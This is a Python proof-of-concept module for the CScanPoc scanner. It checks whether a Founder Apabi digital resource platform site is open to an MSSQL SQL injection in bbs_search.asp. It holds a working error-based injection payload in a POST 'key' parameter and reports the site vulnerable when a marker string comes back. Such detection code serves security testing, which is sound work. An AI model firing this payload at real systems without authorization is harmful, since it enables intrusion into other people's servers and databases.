# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Founder_0003'  # 平台漏洞编号，留空
    name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-26'  # 漏洞公布时间
    desc = '''
        北京方正阿帕比技术有限公司是北大方正信息产业集团有限公司旗下专业的数字出版技术及产品提供商。方正阿帕比公司自2001年起进入数字出版领域，在继承并发展方正传统出版印刷技术优势的基础上，自主研发了数字出版技术及整体解决方案，已发展成为全球领先的数字出版技术提供商。
        方正Apabi数字资源平台 /dlib/bbs/bbs_search.asp?lang=gb 存在MSSQL SQL注射漏洞。
        /dlib/bbs/bbs_search.asp?lang=gb
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0103581'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '方正Apabi数字资源平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9243223f-0719-43f3-9790-5c3a1ab0fc46'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.2 http://www.wooyun.org/bugs/wooyun-2010-0103581
            payload = "/dlib/bbs/bbs_search.asp?lang=gb"
            post = "key=1%27%29%20and%201%3Dconvert%28int%2C%27hen%27%2b%27tai%27%29%20and%20%28%271%27%20like%20%271"
            code, head, body, errcode1, final_url = hh.http(
                self.target + payload, post=post)
            if 'hentai' in body:
                #security_hole(arg+payload+" && post:"+post)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
